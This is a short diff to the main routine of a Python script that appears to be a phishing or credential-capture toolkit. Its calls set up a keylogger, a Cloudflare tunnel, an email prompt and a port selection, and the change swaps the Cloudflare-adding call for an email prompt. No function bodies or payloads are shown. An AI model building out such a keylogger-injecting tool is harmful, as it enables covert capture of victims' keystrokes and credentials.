@@ -35,7 +35,7 @@ if __name__ == "__main__":
         keyloggerprompt()
         addingkeylogger()
         cloudfarePrompt()
-        addingCloudfare()
+        emailPrompt()
         inputCustom()
         port = selectPort()
 
